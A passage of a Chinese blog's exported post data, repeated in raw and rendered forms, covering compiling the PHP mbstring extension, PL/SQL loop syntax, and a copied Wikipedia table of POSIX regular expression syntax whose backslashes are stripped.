/></p><p>&nbsp;</p>","source":"_posts/php-添加扩展模块.md","raw":"title: php 添加扩展模块\ncategories: [Linux]\ntags: []\ndate: 2011-12-02 10:49:00\n---\n<p>线上想用zabbix做监控。php安装的时候有很多模块没有安装，mbstring就是其中一个，所以现在要扩展安装一下。</p><p>就拿mbstring为例吧</p><p>环境php5.2.14, 不支持mbstring扩展</p><p>上传php源码，tar 之。<br />shell&gt;cd /usr/local/src/php-5.2.14/ext</p><p>shell&gt;ls&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #下面都模块源码，想安装那个就进那个目录</p><p>shell&gt;cd mbstring</p><p>shell&gt;phpize<br />shell&gt;./configure --with-php-config=/usr/local/php/bin/php-config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定php-config文件<br />shell&gt;make<br />shell&gt;make install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看这一步的输出可以看出是模块的目录,我的是/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>shell&gt;vim /usr/local/php/lib/php.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #编辑php.ini添加扩展目录。</p><p>extension_dir=/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>extension=mbstring.so</p><p>重启一个web服务，用phpinfo看看是否支持mbstring。<br /></p><p>&nbsp;</p>","slug":"php-添加扩展模块","published":1,"updated":"2023-04-22T05:38:44.879Z","_id":"clgrjlxix00667opig8bv55ee","comments":1,"layout":"post","photos":[],"link":"","content":"<p>线上想用zabbix做监控。php安装的时候有很多模块没有安装，mbstring就是其中一个，所以现在要扩展安装一下。</p><p>就拿mbstring为例吧</p><p>环境php5.2.14, 不支持mbstring扩展</p><p>上传php源码，tar 之。<br />shell&gt;cd /usr/local/src/php-5.2.14/ext</p><p>shell&gt;ls&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #下面都模块源码，想安装那个就进那个目录</p><p>shell&gt;cd mbstring</p><p>shell&gt;phpize<br />shell&gt;./configure --with-php-config=/usr/local/php/bin/php-config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定php-config文件<br />shell&gt;make<br />shell&gt;make install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看这一步的输出可以看出是模块的目录,我的是/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>shell&gt;vim /usr/local/php/lib/php.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #编辑php.ini添加扩展目录。</p><p>extension_dir=/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>extension=mbstring.so</p><p>重启一个web服务，用phpinfo看看是否支持mbstring。<br /></p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>线上想用zabbix做监控。php安装的时候有很多模块没有安装，mbstring就是其中一个，所以现在要扩展安装一下。</p><p>就拿mbstring为例吧</p><p>环境php5.2.14, 不支持mbstring扩展</p><p>上传php源码，tar 之。<br />shell&gt;cd /usr/local/src/php-5.2.14/ext</p><p>shell&gt;ls&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #下面都模块源码，想安装那个就进那个目录</p><p>shell&gt;cd mbstring</p><p>shell&gt;phpize<br />shell&gt;./configure --with-php-config=/usr/local/php/bin/php-config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定php-config文件<br />shell&gt;make<br />shell&gt;make install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看这一步的输出可以看出是模块的目录,我的是/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>shell&gt;vim /usr/local/php/lib/php.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #编辑php.ini添加扩展目录。</p><p>extension_dir=/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>extension=mbstring.so</p><p>重启一个web服务，用phpinfo看看是否支持mbstring。<br /></p><p>&nbsp;</p>"},{"title":"PLSQL 两种循环for和while","date":"2013-11-19T15:01:18.000Z","_content":"第一种 while\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nwhile i<=100 loop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\nend;\n</pre>\n第二种 for\n<pre>\nbegin\nfor i in 1..100 loop\nDbms_Output.put_line('i=' || i);\nend loop;\ncommit;\nend;\n</pre>\n第三种 也可以直接使用loop( 死循环，游标中使用)\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nloop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\ncommit;\nend;\n</pre>","source":"_posts/PLSQL-两种循环for和while.md","raw":"title: PLSQL 两种循环for和while\ncategories: [Oracle,数据库]\ntags: []\ndate: 2013-11-19 23:01:18\n---\n第一种 while\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nwhile i<=100 loop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\nend;\n</pre>\n第二种 for\n<pre>\nbegin\nfor i in 1..100 loop\nDbms_Output.put_line('i=' || i);\nend loop;\ncommit;\nend;\n</pre>\n第三种 也可以直接使用loop( 死循环，游标中使用)\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nloop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\ncommit;\nend;\n</pre>","slug":"PLSQL-两种循环for和while","published":1,"updated":"2023-04-22T05:38:44.686Z","_id":"clgrjlxiz00677opi90a96th4","comments":1,"layout":"post","photos":[],"link":"","content":"<p>第一种 while</p>\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nwhile i<=100 loop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\nend;\n</pre>\n<p>第二种 for</p>\n<pre>\nbegin\nfor i in 1..100 loop\nDbms_Output.put_line('i=' || i);\nend loop;\ncommit;\nend;\n</pre>\n<p>第三种 也可以直接使用loop( 死循环，游标中使用)</p>\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nloop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\ncommit;\nend;\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>第一种 while</p>\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nwhile i<=100 loop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\nend;\n</pre>\n<p>第二种 for</p>\n<pre>\nbegin\nfor i in 1..100 loop\nDbms_Output.put_line('i=' || i);\nend loop;\ncommit;\nend;\n</pre>\n<p>第三种 也可以直接使用loop( 死循环，游标中使用)</p>\n<pre>\ndeclare\ni number;\nbegin\ni:=0;\nloop\nDbms_Output.put_line('i=' || i);\ni:=i+1;\nend loop;\ncommit;\nend;\n</pre>"},{"title":"POSIX basic and extended","date":"2014-02-25T14:22:36.000Z","_content":"<strong>引用：http://en.wikipedia.org/wiki/Regular_expression</strong>\n<h4>POSIX basic and extended[<a title=\"Edit section: POSIX basic and extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=10\">edit</a>]</h4>\nIn the <a title=\"POSIX\" href=\"http://en.wikipedia.org/wiki/POSIX\">POSIX</a> standard, Basic Regular Syntax, BRE, requires that the <a title=\"Metacharacter\" href=\"http://en.wikipedia.org/wiki/Metacharacter\">metacharacters</a> ( ) and { } be designated () and {}, whereas Extended Regular Syntax, ERE, does not.\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>.</th>\n<td>Matches any single character (many applications exclude <a title=\"Newline\" href=\"http://en.wikipedia.org/wiki/Newline\">newlines</a>, and exactly which characters are considered newlines is flavor-, character-encoding-, and platform-specific, but it is safe to assume that the line feed character is included). Within POSIX bracket expressions, the dot character matches a literal dot. For example, a.c matches \"abc\", etc., but [a.c] matches only \"a\", \".\", or \"c\".</td>\n</tr>\n<tr valign=\"top\">\n<th>[ ]</th>\n<td>A bracket expression. Matches a single character that is contained within the brackets. For example, [abc] matches \"a\", \"b\", or \"c\". [a-z]specifies a range which matches any lowercase letter from \"a\" to \"z\". These forms can be mixed: [abcx-z] matches \"a\", \"b\", \"c\", \"x\", \"y\", or \"z\", as does [a-cx-z].The - character is treated as a literal character if it is the last or the first (after the ^, if present) character within the brackets: [abc-], [-abc]. Note that backslash escapes are not allowed. The ] character can be included in a bracket expression if it is the first (after the ^) character: []abc].</td>\n</tr>\n<tr valign=\"top\">\n<th>[^ ]</th>\n<td>Matches a single character that is not contained within the brackets. For example, [^abc] matches any character other than \"a\", \"b\", or \"c\".[^a-z] matches any single character that is not a lowercase letter from \"a\" to \"z\". Likewise, literal characters and ranges can be mixed.</td>\n</tr>\n<tr valign=\"top\">\n<th>^</th>\n<td>Matches the starting position within the string. In line-based tools, it matches the starting position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>$</th>\n<td>Matches the ending position of the string or the position just before a string-ending newline. In line-based tools, it matches the ending position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>( )</th>\n<td>Defines a marked subexpression. The string matched within the parentheses can be recalled later (see the next entry, <i>n</i>). A marked subexpression is also called a block or capturing group. <b>BRE mode requires ( )</b>.</td>\n</tr>\n<tr valign=\"top\">\n<th><i>n</i></th>\n<td>Matches what the <i>n</i>th marked subexpression matched, where <i>n</i> is a digit from 1 to 9. This construct is vaguely defined in the POSIX.2 standard. Some tools allow referencing more than nine capturing groups.</td>\n</tr>\n<tr valign=\"top\">\n<th>*</th>\n<td>Matches the preceding element zero or more times. For example, ab*c matches \"ac\", \"abc\", \"abbbc\", etc. [xyz]* matches \"\", \"x\", \"y\", \"z\", \"zx\", \"zyx\", \"xyzzy\", and so on. (ab)* matches \"\", \"ab\", \"abab\", \"ababab\", and so on.</td>\n</tr>\n<tr valign=\"top\">\n<th>{<i>m</i>,<i>n</i>}</th>\n<td>Matches the preceding element at least <i>m</i> and not more than <i>n</i> times. For example, a{3,5} matches only \"aaa\", \"aaaa\", and \"aaaaa\". This is not found in a few older instances of regular expressions. <b>BRE mode requires {<i>m</i>,<i>n</i>}</b>.</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n\t<li>.at matches any three-character string ending with \"at\", including \"hat\", \"cat\", and \"bat\".</li>\n\t<li>[hc]at matches \"hat\" and \"cat\".</li>\n\t<li>[^b]at matches all strings matched by .at except \"bat\".</li>\n\t<li>[^hc]at matches all strings matched by .at other than \"hat\" and \"cat\".</li>\n\t<li>^[hc]at matches \"hat\" and \"cat\", but only at the beginning of the string or line.</li>\n\t<li>[hc]at$ matches \"hat\" and \"cat\", but only at the end of the string or line.</li>\n\t<li>[.] matches any single character surrounded by \"[\" and \"]\" since the brackets are escaped, for example: \"[a]\" and \"[b]\".</li>\n\t<li>s.* matches any number of characters preceded by s , for example: \"saw\" and \"seed\".</li>\n</ul>\n<h4>POSIX extended[<a title=\"Edit section: POSIX extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=11\">edit</a>]</h4>\nThe meaning of metacharacters <a title=\"Escape sequence\" href=\"http://en.wikipedia.org/wiki/Escape_sequence\">escaped</a> with a backslash is reversed for some characters in the POSIX Extended Regular Expression (ERE) syntax. With this syntax, a backslash causes the metacharacter to be treated as a literal character. So, for example, ( ) is now ( ) and { } is now { }. Additionally, support is removed for <i>n</i> backreferences and the following metacharacters are added:\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>?</th>\n<td>Matches the preceding element zero or one time. For example, ab?c matches only \"ac\" or \"abc\".</td>\n</tr>\n<tr>\n<th>+</th>\n<td>Matches the preceding element one or more times. For example, ab+c matches \"abc\", \"abbc\", \"abbbc\", and so on, but not \"ac\".</td>\n</tr>\n<tr>\n<th>|</th>\n<td>The choice (also known as alternation or set union) operator matches either the expression before or the expression after the operator. For example, abc|def matches \"abc\" or \"def\".</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n\t<li>[hc]+at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", and so on, but not \"at\".</li>\n\t<li>[hc]?at matches \"hat\", \"cat\", and \"at\".</li>\n\t<li>[hc]*at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", \"at\", and so on.</li>\n\t<li>cat|dog matches \"cat\" or \"dog\".</li>\n</ul>\nPOSIX Extended Regular Expressions can often be used with modern Unix utilities by including the <a title=\"Command line\" href=\"http://en.wikipedia.org/wiki/Command_line\">command line</a> flag <var>-E</var>.\n<h4>Character classes[<a title=\"Edit section: Character classes\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=12\">edit</a>]</h4>\nThe character class is the most basic regular expression concept after a literal match. It makes one small sequence of characters match a larger set of characters. For example, [A-Z] could stand for the alphabet, and d could mean any digit. Character classes apply to both POSIX levels.\nWhen specifying a range of characters, such as [a-Z] computer's locale settings determine the contents by the numeric ordering of the character encoding. They could store digits in that sequence, or the ordering could be <i>abc...zABC...Z</i>, or <i>aAbBcC...zZ</i>. So the POSIX standard defines a character class, which will be known by the regular expression processor installed. Those definitions are in the following table:\n<table>\n<tbody>\n<tr>\n<th>POSIX</th>\n<th>Non-standard</th>\n<th>Perl/Tcl</th>\n<th>Vim</th>\n<th>ASCII</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>[:alnum:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[A-Za-z0-9]</td>\n<td>Alphanumeric characters</td>\n</tr>\n<tr>\n<td></td>\n<td>[:word:]</td>\n<td>w</td>\n<td>w</td>\n<td>[A-Za-z0-9_]</td>\n<td>Alphanumeric characters plus \"_\"</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>W</td>\n<td>W</td>\n<td>[^A-Za-z0-9_]</td>\n<td>Non-word characters</td>\n</tr>\n<tr>\n<td>[:alpha:]</td>\n<td></td>\n<td></td>\n<td>a</td>\n<td>[A-Za-z]</td>\n<td>Alphabetic characters</td>\n</tr>\n<tr>\n<td>[:blank:]</td>\n<td></td>\n<td></td>\n<td>s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a>]</td>\n<td>Space and tab</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>b</td>\n<td>&lt; &gt;</td>\n<td>(?&lt;=W)(?=w)|(?&lt;=w)(?=W)</td>\n<td>Word boundaries</td>\n</tr>\n<tr>\n<td>[:cntrl:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x00-x1Fx7F]</td>\n<td><a title=\"Control character\" href=\"http://en.wikipedia.org/wiki/Control_character\">Control characters</a></td>\n</tr>\n<tr>\n<td>[:digit:]</td>\n<td></td>\n<td>d</td>\n<td>d</td>\n<td>[0-9]</td>\n<td>Digits</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>D</td>\n<td>D</td>\n<td>[^0-9]</td>\n<td>Non-digits</td>\n</tr>\n<tr>\n<td>[:graph:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x21-x7E]</td>\n<td>Visible characters</td>\n</tr>\n<tr>\n<td>[:lower:]</td>\n<td></td>\n<td></td>\n<td>l</td>\n<td>[a-z]</td>\n<td>Lowercase letters</td>\n</tr>\n<tr>\n<td>[:print:]</td>\n<td></td>\n<td></td>\n<td>p</td>\n<td>[x20-x7E]</td>\n<td>Visible characters and the space character</td>\n</tr>\n<tr>\n<td>[:punct:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[][!\"#$%&amp;'()*+,./:;&lt;=&gt;?@^_`{|}~-]</td>\n<td>Punctuation characters</td>\n</tr>\n<tr>\n<td>[:space:]</td>\n<td></td>\n<td>s</td>\n<td>_s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a><a title=\"r\" href=\"http://en.wikipedia.org/wiki/%5Cr\">r</a><a title=\"n\" href=\"http://en.wikipedia.org/wiki/%5Cn\">n</a><a title=\"v\" href=\"http://en.wikipedia.org/wiki/%5Cv\">v</a><a title=\"f\" href=\"http://en.wikipedia.org/wiki/%5Cf\">f</a>]</td>\n<td><a title=\"Whitespace character\" href=\"http://en.wikipedia.org/wiki/Whitespace_character\">Whitespace characters</a></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>S</td>\n<td></td>\n<td>[^ trnvf]</td>\n<td>Non-whitespace characters</td>\n</tr>\n<tr>\n<td>[:upper:]</td>\n<td></td>\n<td></td>\n<td>u</td>\n<td>[A-Z]</td>\n<td>Uppercase letters</td>\n</tr>\n<tr>\n<td>[:xdigit:]</td>\n<td></td>\n<td></td>\n<td>x</td>\n<td>[A-Fa-f0-9]</td>\n<td>Hexadecimal digits</td>\n</tr>\n</tbody>\n</table>\nPOSIX character classes can only be used within bracket expressions. For example, [[:upper:]ab] matches the uppercase letters and lowercase \"a\" and \"b\".\nAn additional non-POSIX class understood by some tools is [:word:], which is usually defined as [:alnum:] plus underscore. This reflects the fact that in many programming languages these are the characters that may be used in identifiers. The editor <a title=\"Vim (text editor)\" href=\"http://en.wikipedia.org/wiki/Vim_(text_editor)\">Vim</a> further distinguishes <i>word</i> and <i>word-head</i> classes (using the notation w and h) since in many programming languages the characters that can begin an identifier are not the same as those that can occur in other positions.\nNote that what the POSIX regular expression standards call <i>character classes</i> are commonly referred to as <i>POSIX character classes</i> in other regular expression flavors which support them. With most other regular expression flavors, the term <i>character class</i> is used to describe what POSIX calls <i>bracket expressions</i>.\nC默认在*NIX下面，可以使用这些规则，最基本的POSIX语法，不需要其他的扩展库。","source":"_posts/POSIX-basic-and-extended.md","raw":"title: POSIX basic and extended\ncategories: [程序设计,操作系统,Linux,C编程]\ntags: []\ndate: 2014-02-25 22:22:36\n---\n<strong>引用：http://en.wikipedia.org/wiki/Regular_expression</strong>\n<h4>POSIX basic and extended[<a title=\"Edit section: POSIX basic and extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=10\">edit</a>]</h4>\nIn the <a title=\"POSIX\" href=\"http://en.wikipedia.org/wiki/POSIX\">POSIX</a> standard, Basic Regular Syntax, BRE, requires that the <a title=\"Metacharacter\" href=\"http://en.wikipedia.org/wiki/Metacharacter\">metacharacters</a> ( ) and { } be designated () and {}, whereas Extended Regular Syntax, ERE, does not.\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>.</th>\n<td>Matches any single character (many applications exclude <a title=\"Newline\" href=\"http://en.wikipedia.org/wiki/Newline\">newlines</a>, and exactly which characters are considered newlines is flavor-, character-encoding-, and platform-specific, but it is safe to assume that the line feed character is included). Within POSIX bracket expressions, the dot character matches a literal dot. For example, a.c matches \"abc\", etc., but [a.c] matches only \"a\", \".\", or \"c\".</td>\n</tr>\n<tr valign=\"top\">\n<th>[ ]</th>\n<td>A bracket expression. Matches a single character that is contained within the brackets. For example, [abc] matches \"a\", \"b\", or \"c\". [a-z]specifies a range which matches any lowercase letter from \"a\" to \"z\". These forms can be mixed: [abcx-z] matches \"a\", \"b\", \"c\", \"x\", \"y\", or \"z\", as does [a-cx-z].The - character is treated as a literal character if it is the last or the first (after the ^, if present) character within the brackets: [abc-], [-abc]. Note that backslash escapes are not allowed. The ] character can be included in a bracket expression if it is the first (after the ^) character: []abc].</td>\n</tr>\n<tr valign=\"top\">\n<th>[^ ]</th>\n<td>Matches a single character that is not contained within the brackets. For example, [^abc] matches any character other than \"a\", \"b\", or \"c\".[^a-z] matches any single character that is not a lowercase letter from \"a\" to \"z\". Likewise, literal characters and ranges can be mixed.</td>\n</tr>\n<tr valign=\"top\">\n<th>^</th>\n<td>Matches the starting position within the string. In line-based tools, it matches the starting position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>$</th>\n<td>Matches the ending position of the string or the position just before a string-ending newline. In line-based tools, it matches the ending position of any line.</td>\n</tr>\n<tr valign=\"top\">\n<th>( )</th>\n<td>Defines a marked subexpression. The string matched within the parentheses can be recalled later (see the next entry, <i>n</i>). A marked subexpression is also called a block or capturing group. <b>BRE mode requires ( )</b>.</td>\n</tr>\n<tr valign=\"top\">\n<th><i>n</i></th>\n<td>Matches what the <i>n</i>th marked subexpression matched, where <i>n</i> is a digit from 1 to 9. This construct is vaguely defined in the POSIX.2 standard. Some tools allow referencing more than nine capturing groups.</td>\n</tr>\n<tr valign=\"top\">\n<th>*</th>\n<td>Matches the preceding element zero or more times. For example, ab*c matches \"ac\", \"abc\", \"abbbc\", etc. [xyz]* matches \"\", \"x\", \"y\", \"z\", \"zx\", \"zyx\", \"xyzzy\", and so on. (ab)* matches \"\", \"ab\", \"abab\", \"ababab\", and so on.</td>\n</tr>\n<tr valign=\"top\">\n<th>{<i>m</i>,<i>n</i>}</th>\n<td>Matches the preceding element at least <i>m</i> and not more than <i>n</i> times. For example, a{3,5} matches only \"aaa\", \"aaaa\", and \"aaaaa\". This is not found in a few older instances of regular expressions. <b>BRE mode requires {<i>m</i>,<i>n</i>}</b>.</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n\t<li>.at matches any three-character string ending with \"at\", including \"hat\", \"cat\", and \"bat\".</li>\n\t<li>[hc]at matches \"hat\" and \"cat\".</li>\n\t<li>[^b]at matches all strings matched by .at except \"bat\".</li>\n\t<li>[^hc]at matches all strings matched by .at other than \"hat\" and \"cat\".</li>\n\t<li>^[hc]at matches \"hat\" and \"cat\", but only at the beginning of the string or line.</li>\n\t<li>[hc]at$ matches \"hat\" and \"cat\", but only at the end of the string or line.</li>\n\t<li>[.] matches any single character surrounded by \"[\" and \"]\" since the brackets are escaped, for example: \"[a]\" and \"[b]\".</li>\n\t<li>s.* matches any number of characters preceded by s , for example: \"saw\" and \"seed\".</li>\n</ul>\n<h4>POSIX extended[<a title=\"Edit section: POSIX extended\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=11\">edit</a>]</h4>\nThe meaning of metacharacters <a title=\"Escape sequence\" href=\"http://en.wikipedia.org/wiki/Escape_sequence\">escaped</a> with a backslash is reversed for some characters in the POSIX Extended Regular Expression (ERE) syntax. With this syntax, a backslash causes the metacharacter to be treated as a literal character. So, for example, ( ) is now ( ) and { } is now { }. Additionally, support is removed for <i>n</i> backreferences and the following metacharacters are added:\n<table>\n<tbody>\n<tr>\n<th>Metacharacter</th>\n<th>Description</th>\n</tr>\n<tr valign=\"top\">\n<th>?</th>\n<td>Matches the preceding element zero or one time. For example, ab?c matches only \"ac\" or \"abc\".</td>\n</tr>\n<tr>\n<th>+</th>\n<td>Matches the preceding element one or more times. For example, ab+c matches \"abc\", \"abbc\", \"abbbc\", and so on, but not \"ac\".</td>\n</tr>\n<tr>\n<th>|</th>\n<td>The choice (also known as alternation or set union) operator matches either the expression before or the expression after the operator. For example, abc|def matches \"abc\" or \"def\".</td>\n</tr>\n</tbody>\n</table>\n<b>Examples:</b>\n<ul>\n\t<li>[hc]+at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", and so on, but not \"at\".</li>\n\t<li>[hc]?at matches \"hat\", \"cat\", and \"at\".</li>\n\t<li>[hc]*at matches \"hat\", \"cat\", \"hhat\", \"chat\", \"hcat\", \"cchchat\", \"at\", and so on.</li>\n\t<li>cat|dog matches \"cat\" or \"dog\".</li>\n</ul>\nPOSIX Extended Regular Expressions can often be used with modern Unix utilities by including the <a title=\"Command line\" href=\"http://en.wikipedia.org/wiki/Command_line\">command line</a> flag <var>-E</var>.\n<h4>Character classes[<a title=\"Edit section: Character classes\" href=\"http://en.wikipedia.org/w/index.php?title=Regular_expression&amp;action=edit&amp;section=12\">edit</a>]</h4>\nThe character class is the most basic regular expression concept after a literal match. It makes one small sequence of characters match a larger set of characters. For example, [A-Z] could stand for the alphabet, and d could mean any digit. Character classes apply to both POSIX levels.\nWhen specifying a range of characters, such as [a-Z] computer's locale settings determine the contents by the numeric ordering of the character encoding. They could store digits in that sequence, or the ordering could be <i>abc...zABC...Z</i>, or <i>aAbBcC...zZ</i>. So the POSIX standard defines a character class, which will be known by the regular expression processor installed. Those definitions are in the following table:\n<table>\n<tbody>\n<tr>\n<th>POSIX</th>\n<th>Non-standard</th>\n<th>Perl/Tcl</th>\n<th>Vim</th>\n<th>ASCII</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>[:alnum:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[A-Za-z0-9]</td>\n<td>Alphanumeric characters</td>\n</tr>\n<tr>\n<td></td>\n<td>[:word:]</td>\n<td>w</td>\n<td>w</td>\n<td>[A-Za-z0-9_]</td>\n<td>Alphanumeric characters plus \"_\"</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>W</td>\n<td>W</td>\n<td>[^A-Za-z0-9_]</td>\n<td>Non-word characters</td>\n</tr>\n<tr>\n<td>[:alpha:]</td>\n<td></td>\n<td></td>\n<td>a</td>\n<td>[A-Za-z]</td>\n<td>Alphabetic characters</td>\n</tr>\n<tr>\n<td>[:blank:]</td>\n<td></td>\n<td></td>\n<td>s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a>]</td>\n<td>Space and tab</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>b</td>\n<td>&lt; &gt;</td>\n<td>(?&lt;=W)(?=w)|(?&lt;=w)(?=W)</td>\n<td>Word boundaries</td>\n</tr>\n<tr>\n<td>[:cntrl:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x00-x1Fx7F]</td>\n<td><a title=\"Control character\" href=\"http://en.wikipedia.org/wiki/Control_character\">Control characters</a></td>\n</tr>\n<tr>\n<td>[:digit:]</td>\n<td></td>\n<td>d</td>\n<td>d</td>\n<td>[0-9]</td>\n<td>Digits</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>D</td>\n<td>D</td>\n<td>[^0-9]</td>\n<td>Non-digits</td>\n</tr>\n<tr>\n<td>[:graph:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[x21-x7E]</td>\n<td>Visible characters</td>\n</tr>\n<tr>\n<td>[:lower:]</td>\n<td></td>\n<td></td>\n<td>l</td>\n<td>[a-z]</td>\n<td>Lowercase letters</td>\n</tr>\n<tr>\n<td>[:print:]</td>\n<td></td>\n<td></td>\n<td>p</td>\n<td>[x20-x7E]</td>\n<td>Visible characters and the space character</td>\n</tr>\n<tr>\n<td>[:punct:]</td>\n<td></td>\n<td></td>\n<td></td>\n<td>[][!\"#$%&amp;'()*+,./:;&lt;=&gt;?@^_`{|}~-]</td>\n<td>Punctuation characters</td>\n</tr>\n<tr>\n<td>[:space:]</td>\n<td></td>\n<td>s</td>\n<td>_s</td>\n<td>[ <a title=\"t\" href=\"http://en.wikipedia.org/wiki/%5Ct\">t</a><a title=\"r\" href=\"http://en.wikipedia.org/wiki/%5Cr\">r</a><a title=\"n\" href=\"http://en.wikipedia.org/wiki/%5Cn\">n</a><a title=\"v\" href=\"http://en.wikipedia.org/wiki/%5Cv\">v</a><a title=\"f\" href=\"http://en.wikipedia.org/wiki/%5Cf\">f</a>]</td>\n<td><a title=\"Whitespace character\" href=\"http://en.wikipedia.org/wiki/Whitespace_character\">Whitespace characters</a></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>S</td>\n<td></td>\n<td>[^ trnvf]</td>\n<td>Non-whitespace characters</td>\n</tr>\n<tr>\n<td>[:upper:]</td>\n<td></td>\n<td></td>\n<td>u</td>\n<td>[A-Z]</td>\n<td>Uppercase letters</td>\n</tr>\n<tr>\n<td>[:xdigit:]</td>\n<td></td>\n<td></td>\n<td>x</td>\n<td>[A-Fa-f0-9]</td>\n<td>Hexadecimal digits</td>\n</tr>\n</tbody>\n</table>\nPOSIX character classes can only be used within bracket expressions. For example, [[:upper:]ab] matches the uppercase letters and lowercase \"a\" and \"b\".\nAn additional non-POSIX class understood by some tools is [:word:], which is usually defined as [:alnum:] plus underscore. This reflects the fact that in many programming languages these are the characters that may be used in identifiers. The editor <a title=\"Vim (text editor)\" href=\"http://en.wikipedia.org/wiki/Vim_(text_editor)\">Vim</a> further distinguishes <i>word</i> and <i>word-head</i> classes (using the notation w and h) since in many programming languages the characters that can begin an identifier are not the same as those that can occur in other positions.\nNote that what the POSIX regular expression standards call <i>character classes</i> are commonly referred to as <i>POSIX character classes</i> in other regular expression flavors which support them. With most other regular expression flavors, the term <i>character class</i> is used to describe what POSIX calls <i>bracket 